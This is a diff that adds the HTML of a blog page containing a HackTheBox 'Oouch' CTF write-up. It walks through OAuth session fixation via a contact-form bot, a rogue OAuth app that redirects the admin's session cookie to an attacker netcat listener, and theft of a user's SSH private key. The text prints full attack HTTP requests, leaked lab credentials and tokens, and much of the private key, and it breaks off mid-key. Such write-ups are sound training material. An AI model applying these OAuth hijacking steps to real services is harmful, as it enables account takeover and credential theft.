@@ -1,0 +1,466 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Oouch | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,linux,hard"><meta name=description content="Oouch HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/oouch/><link crossorigin=anonymous href=/assets/css/stylesheet.c5de734fbd88c3d21543485ffbcb1ccdda89a86a780cf987fa00199c41dbc947.css integrity="sha256-xd5zT72Iw9IVQ0hf+8sczdqJqGp4DPmH+gAZnEHbyUc=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/oouch/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Oouch "><meta property="og:description" content="Oouch HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/oouch/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/oouch/oouch.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-07-31T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/oouch/oouch.png"><meta name=twitter:title content="Oouch "><meta name=twitter:description content="Oouch HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Oouch ","item":"https://s4ch.github.io/writeups/hackthebox/oouch/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Oouch ","name":"Oouch ","description":"Oouch HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","linux","hard"],"articleBody":"≡ƒÆó Info Name: Oouch Profile: www.hackthebox.eu Difficulty: Hard OS: Linux Points: 40 Overview TL;DR: The 1st part is a lot about oAuth and the pe part about DBus and UWSGI.\nInstall tools used in this WU on BlackArch Linux:\n$ sudo pacman -S nmap filezilla ffuf burpsuite gnu-netcat Network Enumeration Let’s discover available services with a nmap scan:\n$ sudo nmap -p- -sSVC 10.10.10.177 -oA nmap_full [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 23:51 CEST WARNING: Service 10.10.10.177:8000 had already soft-matched rtsp, but now soft-matched sip; ignoring second value Nmap scan report for 10.10.10.177 Host is up (0.022s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.0.8 or later | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_-rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.15.102 | Logged in as ftp | TYPE: ASCII | Session bandwidth limit in byte/s is 30000 | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | At session startup, client count was 1 | vsFTPd 3.0.3 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 8d:6b:a7:2b:7a:21:9f:21:11:37:11:ed:50:4f:c6:1e (RSA) |_ 256 d2:af:55:5c:06:0b:60:db:9c:78:47:b5:ca:f4:f1:04 (ED25519) 5000/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 | http-title: Welcome to Oouch |_Requested resource was http://10.10.10.177:5000/login?next=%2F 8000/tcp open rtsp | fingerprint-strings: | FourOhFourRequest, GetRequest, HTTPOptions: | HTTP/1.0 400 Bad Request | Content-Type: text/html | Vary: Authorization | Bad Request (400) | RTSPRequest: | RTSP/1.0 400 Bad Request | Content-Type: text/html | Vary: Authorization | Bad Request (400) | SIPOptions: | SIP/2.0 400 Bad Request | Content-Type: text/html | Vary: Authorization |_ Bad Request (400) |_http-title: Site doesn't have a title (text/html). |_rtsp-methods: ERROR: Script execution failed (use -d to debug) 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.80%I=7%D=6/29%Time=5EFA626D%P=x86_64-unknown-linux-gnu SF:%r(GetRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x SF:20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\nBad\\x20Request\\x20\\(40 SF:0\\)\")%r(FourOhFourRequest,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r SF:\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r\\nBad\\x SF:20Request\\x20\\(400\\)\")%r(HTTPOptions,64,\"HTTP/1\\.0\\x20400\\x20Bad\\x SF:20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authorization\\r\\n\\r SF:\\nBad\\x20Request\\x20\\(400\\)\")%r(RTSPRequest,64,\"RTSP/1\\.0\\x204 SF:00\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x20Authoriz SF:ation\\r\\n\\r\\nBad\\x20Request\\x20\\(400\\)\")%r(SIPOptions,63,\"SIP/ SF:2\\.0\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/html\\r\\nVary:\\x2 SF:0Authorization\\r\\n\\r\\nBad\\x20Request\\x20\\(400\\)\"); Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 48.42 seconds FTP Enumeration Let’s check the FTP anonymous access with FileZilla or ftp CLI command:\n$ ftp 10.10.10.177 Connected to 10.10.10.177. 220 qtc's development server Name (10.10.10.177:cyfun): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e ls 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 ftp ftp 49 Feb 11 19:34 project.txt 226 Directory send OK. Only one file, project.txt, we can’t miss it:\n$ cat project.txt Flask -\u003e Consumer Django -\u003e Authorization Server It seems we will encounter a python web server in the next steps.\nHTTP Discovery Then we have a web application on port 5000: http://10.10.10.177:5000/\nThere are a login and a register form, so let’s register to see what’s behind.\nWe quickly check the menu entries but there is nothing interesting.\nThe only action we can do is send a message on the contact page.\nHTTP Enumeration We’ll use ffuf for directory busting:\n$ ffuf -u http://10.10.10.177:5000/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://10.10.10.177:5000/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ about [Status: 200, Size: 1828, Words: 414, Lines: 55] contact [Status: 200, Size: 1828, Words: 414, Lines: 55] documents [Status: 200, Size: 1828, Words: 414, Lines: 55] home [Status: 200, Size: 1828, Words: 414, Lines: 55] logout [Status: 200, Size: 1828, Words: 414, Lines: 55] login [Status: 200, Size: 1828, Words: 414, Lines: 55] oauth [Status: 200, Size: 1828, Words: 414, Lines: 55] profile [Status: 200, Size: 1828, Words: 414, Lines: 55] register [Status: 200, Size: 2109, Words: 517, Lines: 64] :: Progress: [4658/4658]┬á:: Job [1/1] :: 388 req/sec :: Duration: [0:00:12] :: Errors: 0 :: The only endpoint that not linked in the menu is oauth.\nPlease notice: This functionality is currently under development and not ready to be used in production. However, since you know about this hidden URL, it seems that you got developer access and are supposed to use it.\nIn order to connect your account with our Oouch authorization server, please visit: http://consumer.oouch.htb:5000/oauth/connect\nOnce your account is connected, you should be able to use the authorization server for login. Just visit: http://consumer.oouch.htb:5000/oauth/login\nBefore digging deeper the oAuth process I’ll add the domain names in /etc/hosts as a domain name may be required:\n10.10.10.177 oouch.htb 10.10.10.177 consumer.oouch.htb 10.10.10.177 authorization.oouch.htb If we go to http://consumer.oouch.htb:5000/oauth/connect and login we are redirected several times to end here: http://authorization.oouch.htb:8000/login/\nSo as we saw in project.txt, we must have the following logic:\nFlask -\u003e Consumer -\u003e consumer.oouch.htb:5000 Django -\u003e Authorization Server -\u003e authorization.oouch.htb:8000 oAuth Discovery \u0026 exploitation From here I’ll have to learn about how oAuth works.\nThere are plenty resources to explain security flaws in oAuth, we will look how to perform a Session Fixation Attack on oAuth:\n2020 - SANS (InstituteInformation Security Reading Room) - Four Attacks on OAuth, How to Secure Your OAuthImplementation by Khash Kiani 2015 - OWASP (NL Chapter Meeting 2015-01-15) - OAuth by Jim_Manico 2017 - Attacking the OAuth Protocol by Dhaval Kapil So we will have to conduct an attack following those steps (we will need a proxy like Burp):\nThe victim (admin) is logged in at consumer site (htpp://consumer.oouch.htb:5000) (The oAuth client application) The attacker (us) register an account at consumer site (http://consumer.oouch.htb:5000/register) The attacker register an account at the provider site (http://authorization.oouch.htb:8000/signup/) The attacker login at the provider site to speed-up the process (http://authorization.oouch.htb:8000/login/) The attacker start login locally at consumer site (http://consumer.oouch.htb:5000/login) The attacker goes to the oAuth login page (http://consumer.oouch.htb:5000/oauth) The attacker start the connection process: The attacker send the connect request\nGET /oauth/connect HTTP/1.1 Host: consumer.oouch.htb:5000 ... Consumer Site redirects attacker to Provider Site to authorize the consumer site to use the provider site account (the oAuth authorization) (http://authorization.oouch.htb:8000/oauth/authorize/)\nGET /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82\u0026response_type=code\u0026redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token\u0026scope=read HTTP/1.1 Host: authorization.oouch.htb:8000 ... The attacker confirms the authorization by clicking the Authorize button (http://authorization.oouch.htb:8000/oauth/authorize/)\nPOST /oauth/authorize/?client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82\u0026response_type=code\u0026redirect_uri=http://consumer.oouch.htb:5000/oauth/connect/token\u0026scope=read HTTP/1.1 Host: authorization.oouch.htb:8000 ... csrfmiddlewaretoken=VoAxj1ao7mvIrvJDGPCTyB2x6Rq6KEwWWeFwFjEjArMsd2UkWwry6m8hxn737ia2\u0026redirect_uri=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken\u0026scope=read\u0026client_id=UDBtC8HhZI18nJ53kJVJpXp4IIffRhKEXZ0fSd82\u0026state=\u0026response_type=code\u0026allow=Authorize The provider site responds with the redirect URL which contains the authorization code in the code parameter (Authorization Grant)\nGET /oauth/connect/token?code=Srwh8xkKLMf1VDre8HmqGieVQ1aY1C HTTP/1.1 Host: consumer.oouch.htb:5000 ... Here, the attacker DOES NOT follow the redirection (Drop instead of Forward in Burp).\nInstead the attacker copies the Authorization Grant URL and send it to the administrator via the contact form (pseudo-SSRF that we’ll see just after). POST /contact HTTP/1.1 Host: oouch.htb:5000 ... csrf_token=IjQ0ZTk3YTcxZTJkMTUzMjdkODBmZWJlOTk3MWVhNjFlNDQ3YThkMTIi.XvuH3Q.BYECgUUU9-nRB3hYE9dOPPi_4dA\u0026textfield=http%3A%2F%2Fconsumer.oouch.htb%3A5000%2Foauth%2Fconnect%2Ftoken%3Fcode%3DSrwh8xkKLMf1VDre8HmqGieVQ1aY1C\u0026submit=Send The victim follows the link and requests the Authorization Grant URL, and by doing so gives authorization to the Attacker to have full authorized access to Victim’s account on Consumer Site. The attacker waits a minute and goes back to the oAuth connect URL (http://consumer.oouch.htb:5000/oauth/login) and Authorize. The attacker goes back to the profile page on consumer site and checks the account username is now qtc. SSRF If you paste an URL in the contact form, someone will click on it (a bot). So this gives us a pseudo-SSRF (in a phishing way).\nHere the web server receiving the bot visit 1 minute after the message was sent.\n$ ruby -run -e httpd share -p 8000 [2020-06-30 19:09:57] INFO WEBrick 1.6.0 [2020-06-30 19:09:57] INFO ruby 2.7.1 (2020-03-31) [x86_64-linux] [2020-06-30 19:09:57] INFO WEBrick::HTTPServer#start: pid=55191 port=8000 [2020-06-30 19:12:21] ERROR `/' not found. 10.10.10.177 - - [30/Jun/2020:19:12:21 CEST] \"GET / HTTP/1.1\" 404 273 - -\u003e / So we used this SSRF to send the Authorization Grant URL to the victim.\nqtc’s documents Now that we are logged in as qtc (admin) we can access the document endpoint (http://consumer.oouch.htb:5000/documents).\nFilename Content dev_access.txt develop:supermegasecureklarabubu123! -\u003e Allows application registration. o_auth_notes.txt /api/get_user -\u003e user data. oauth/authorize -\u003e Now also supports GET method. todo.txt Chris mentioned all users could obtain my ssh key. Must be a joke… Knowledge from the documents:\nCredentials to register an app There is api to access user data The ssh key of qtc should be available somewhere HTTP Enumeration (again) There must be an endpoint to register an application as said in dev_access.txt.\nLet’s use ffuf to find it, rather straightforward:\n$ ffuf -u http://authorization.oouch.htb:8000/oauth/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://authorization.oouch.htb:8000/oauth/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ applications [Status: 401, Size: 0, Words: 1, Lines: 1] :: Progress: [4658/4658]┬á:: Job [1/1] :: 258 req/sec :: Duration: [0:00:18] :: Errors: 0 :: $ ffuf -u http://authorization.oouch.htb:8000/oauth/applications/FUZZ -r -c -w ~/CTF/tools/SecLists/Discovery/Web-Content/common.txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.1.0-git ________________________________________________ :: Method : GET :: URL : http://authorization.oouch.htb:8000/oauth/applications/FUZZ :: Wordlist : FUZZ: /home/cyfun/CTF/tools/SecLists/Discovery/Web-Content/common.txt :: Follow redirects : true :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403 ________________________________________________ ... register [Status: 401, Size: 0, Words: 1, Lines: 1] :: Progress: [4658/4658]┬á:: Job [1/1] :: 194 req/sec :: Duration: [0:00:24] :: Errors: 0 :: So we should be able to register an app at http://authorization.oouch.htb:8000/oauth/applications/register\nRegistering an app Go at http://authorization.oouch.htb:8000/oauth/applications/register\nWe are prompted for credentials (Oouch Development):\nLet’s use dev_access.txt:\ndevelop:supermegasecureklarabubu123! -\u003e Allows application registration. We can now access the registration form:\nLet’s try to register an app.\nName: cyfunapp Client id: ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX Client secret: Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs Client type: Public Authorization grant type: Authorization code Redirect uris: http://10.10.15.142:8888/ (attacker machine) http://authorization.oouch.htb:8000/oauth/applications/2/\nLet’s start a listener:\n$ nc -nlvp 8888 Now reading some Oracle documentation - Authenticate using OAuth 2.0\nWe know we must request http://authorization.oouch.htb:8000/oauth/authorize endpoint with some well known params.\nhttp://authorization.oouch.htb:8000/oauth/authorize?response_type=code\u0026client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX\u0026redirect_uri=http://10.10.15.142:8888/\u0026grant_type=authorization_code\u0026client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs Let’s try this URL:\nIf we confirm the authorization we receive the Authorization Grant URL like earlier.\n$ nc -nlvp 8888 Connection from 10.10.15.142:41502 GET /?code=68fq0Y8Anbh0Elid3ERKvrb9UCzsbO HTTP/1.1 Host: 10.10.15.142:8888 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Referer: http://authorization.oouch.htb:8000/oauth/authorize/?response_type=code\u0026client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX\u0026redirect_uri=http://10.10.15.142:8888/\u0026grant_type=authorization_code\u0026client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs Connection: close Upgrade-Insecure-Requests: 1 2nd oAuth exploitation Let’s go back to the contact page (http://consumer.oouch.htb:5000/contact) and use the pseudo-SSRF to gain qtc access, not to the consumer site but to the provider site this time.\nAfter a few minutes we receive the cookie of qtc:\n$ nc -nlvp 8888 Connection from 10.10.10.177:55806 GET /?error=invalid_request\u0026error_description=Missing+response_type+parameter. HTTP/1.1 Host: 10.10.15.142:8888 User-Agent: python-requests/2.21.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e; Let’s request http://authorization.oouch.htb:8000/ but with qtc’s cookie.\nWe are now logged in as qtc:\nAs listed on the home page there is a token endpoint but it seems not reachable with GET, so let’s try a POST (as explained in Oracle oAuth doc anyway). The doc also tells us which params to use.\nPOST /oauth/token/ HTTP/1.1 Host: authorization.oouch.htb:8000 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e; csrftoken=w8Q1tZ5XGQnYIfsjJMNksuQoCg5yYHOtkiWHEK2j8Xsu4ti75whbRr32oLBxC6bZ Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 223 grant_type=client_credentials\u0026client_id=ZOm8R6GdrX3CacO5mvG3pVuSYcKQWXrpN8aSCDuX\u0026client_secret=Wy3JSx7w98SUgoKC1SldvjndEVATgXnoh7WgkLWNkWSWlgnxUniRqHbIRsGAZvxsMQUo1bB2XojK3jNZ7lCCpdIBIkCXspP4H2SveQ3GXHd49F3ACp3mgFddkIcmDJAs``` We receive this error: ```json {\"error\": \"unauthorized_client\"} So let’s log as cyfun2 again, access the app params (http://authorization.oouch.htb:8000/oauth/applications/2/) and change Authorization Grant Type to client-credentials.\nNow we can spoof qtc cookie again and retry.\nThis time we obtain a much better answer:\n{ \"access_token\": \"Xkuzgir8C38MeCv2xyq08PFMDF5NwX\", \"expires_in\": 600, \"token_type\": \"Bearer\", \"scope\": \"read write\" } Get qtc SSH key Let’s remember of o_auth_notes.txt:\n/api/get_user -\u003e user data. oauth/authorize -\u003e Now also supports GET method. By using this endpoint we gain nothing:\nGET /api/get_user/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1 Host: authorization.oouch.htb:8000 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e Upgrade-Insecure-Requests: 1 {\"username\": \"qtc\", \"firstname\": \"\", \"lastname\": \"\", \"email\": \"qtc@nonexistend.nonono\"} As we heard of a ssh key in todo.txt, let’s try get_ssh instead of get_user.\nGET /api/get_ssh/?access_token=Xkuzgir8C38MeCv2xyq08PFMDF5NwX HTTP/1.1 Host: authorization.oouch.htb:8000 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: csrftoken=34Evh3Q30RWq1vsa9yWKKc49TXMo3c2TNv96AXeKrL4qD3ZLf9JbDwzKtjRzFPn5; sessionid=08lyfd5lxftdn9v5gd7knjxok4unsf0e Upgrade-Insecure-Requests: 1 {\"ssh_server\": \"consumer.oouch.htb\", \"ssh_user\": \"qtc\", \"ssh_key\": \"-----BEGIN OPENSSH PRIVATE KEY-----\\n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\\n-----END OPENSSH PRIVATE KEY-----\"} So here is the private key of qtc:\n-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn NhAAAAAwEAAQAAAYEAqQvHuKA1i28D1ldvVbFB8PL7ARxBNy8Ve/hfW/V7cmEHTDTJtmk7 LJZzc1djIKKqYL8eB0ZbVpSmINLfJ2xnCbgRLyo5aEbj1Xw+fdr9/yK1Ie55KQjgnghNdg reZeDWnTfBrY8sd18rwBQpxLphpCR367M9Muw6K31tJhNlIwKtOWy5oDo/O88UnqIqaiJV ZFDpHJ/u0uQc8zqqdHR1HtVVbXiM3u5M/6tb3j98Rx7swrNECt2WyrmYorYLoTvGK4frIv bv8lvztG48WrsIEyvSEKNqNUfnRGFYUJZUMridN5iOyavU7iY0loMrn2xikuVrIeUcXRbl zeFwTaxkkChXKgYdnWHs+15qrDmZTzQYgamx7+vD13cTuZqKmHkRFEPDfa/PXloKIqi2jA tZVbgiVqnS0F+4BxE2T38q//G513iR1EXuPzh4jQIBGDCciq5VNs3t0un+gd5Ae40esJKe 